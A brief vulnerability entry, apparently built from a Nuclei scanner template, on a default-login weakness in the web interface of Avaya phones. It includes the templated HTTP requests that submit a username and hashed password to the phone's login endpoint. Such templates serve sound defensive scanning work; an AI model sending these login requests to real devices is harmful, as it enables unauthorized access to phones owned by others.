# Vulnerability: Avaya Phone Web Interface - Default Login
**Classification:** CWE-1392
**Source:** Nuclei Template (`avaya-phone-default-login.yaml`)

## Description
Avaya phone web interface contains a default login vulnerability. An attacker can obtain access to sensitive information, modify data, and/or execute unauthorized operations.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/cgi-bin/J100WebServer.cgi?Operation=0
POST /cgi-bin/J100WebServer.cgi?Operation=1 HTTP/1.1
Host: {{Host}}
Content-Type: application/x-www-form-urlencoded

uname={{username}}&psw={{sha256(concat(password,nonce))}}
```

